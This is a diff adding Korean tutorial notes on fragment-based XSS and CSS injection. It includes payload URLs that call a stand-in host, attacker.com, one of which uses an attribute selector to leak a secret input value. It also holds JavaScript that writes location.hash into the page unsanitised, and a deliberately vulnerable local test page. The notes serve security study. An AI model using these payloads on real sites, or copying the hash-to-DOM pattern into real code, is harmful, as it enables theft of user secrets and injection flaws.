@@ -167,3 +167,87 @@ input[name="secret"][value^="dc"] { background: url(https://attacker.com/leak?q=
 
 ---
 
+## 공격 예제 😎
+
+
+1️⃣ Fragment(#) 기반 XSS 구조
+
+#### URL 예시
+
+```
+https://example.com/page#<style>@import url("https://attacker.com/malicious.css");</style>
+```
+
+> ❌ 서버는 `#<script>alert(1)</script>`를 절대 받지 않음
+> 서버로 fragment가 직접 가지 않기 때문에, **클라이언트 JS가 fragment를 읽어 DOM에 삽입**해야 XSS 가능:
+
+
+```javascript
+let fragment = window.location.hash; // "#<script>alert(1)</script>"
+document.body.innerHTML += fragment;  // DOM에 그대로 삽입 → CSS 성공
+```
+
+* 이 구조에서는 fragment 기반 XSS 가능
+* 서버가 직접 받지 않아도 공격 성공 가능
+* 일반 HTML 렌더링만 하는 서버에서는 **불가능**
+
+
+ 
+```
+https://example.com/page#<style>@import url("https://attacker.com/malicious.css");</style>
+```
+
+
+[브라우저 URL]                   [서버 요청]             [클라이언트 JS]
+https://example.com/page#PAYLOAD  GET /page              window.location.hash -> DOM 삽입
+#<style>~      ❌ fragment 없음       document.body.innerHTML += fragment
+```
+
+* ❌: 서버에는 fragment 안감
+* ✔ : JS가 읽어서 DOM에 넣으면 공격 가능
+
+---
+
+#### fragment 기반 XSS/CSSI 샘플
+
+1️⃣ HTML 샘플 (fragment 기반 CSSI)
+
+```html
+<!-- 파일명: fragment-cssi.html -->
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>Fragment CSSI 테스트</title>
+</head>
+<body>
+  <h1>Fragment 기반 CSS Injection 테스트</h1>
+  <p>주소창에 # 뒤에 CSS payload를 넣어보세요.</p>
+
+  <script>
+    const fragment = window.location.hash;
+
+    if(fragment) {
+      // DOM에 style 삽입
+      const style = document.createElement('style');
+      style.innerHTML = fragment.replace(/^#/, ''); // # 제거 후 적용
+      document.head.appendChild(style);
+    }
+  </script>
+
+  <p>이 글자의 색상이 fragment에 의해 바뀔 수 있습니다.</p>
+</body>
+</html>
+```
+
+### 사용법
+
+* 브라우저 주소창:
+
+```
+file:///C:/path/fragment-cssi.html#body{background-color:yellow;color:red;}
+```
+
+* 페이지 배경색과 글자색이 변경되는 것을 확인 가능
+* 실제로 CSSI가 동작함을 보여주는 안전한 실습용 예제
+
